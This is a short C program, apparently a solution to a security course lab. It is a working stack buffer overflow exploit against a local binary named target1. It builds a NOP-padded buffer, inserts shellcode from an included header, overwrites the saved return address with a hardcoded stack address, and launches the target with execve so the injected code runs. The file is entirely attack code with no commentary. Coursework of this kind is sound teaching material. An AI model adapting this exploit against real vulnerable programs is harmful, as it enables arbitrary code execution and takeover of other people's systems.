#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

int
main ( int argc, char * argv[] )
{
	const char NOP = '\x90';
	const char TERMINATOR = '\0';

	const int CHAR_BYTE = 1;
	const int INT_BYTES = 4;

	const int PC_ADDRESS = 0x3021fec8;
	const int RETURN_ADDRESS = 0x3021fe50;

	const int ADDRESS_OFFSET = PC_ADDRESS - RETURN_ADDRESS;
	const int BUFFER_LENGTH = ADDRESS_OFFSET + INT_BYTES + CHAR_BYTE;
	
	char *	args[3];
	char *	env[1];

	char buf[BUFFER_LENGTH];

	memset(buf, NOP, BUFFER_LENGTH);

	memcpy(buf, shellcode, strlen(shellcode));

	memcpy(buf + ADDRESS_OFFSET, &RETURN_ADDRESS, INT_BYTES);

	buf[BUFFER_LENGTH - 1] = TERMINATOR;

	args[0] = TARGET;
	args[1] = buf;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
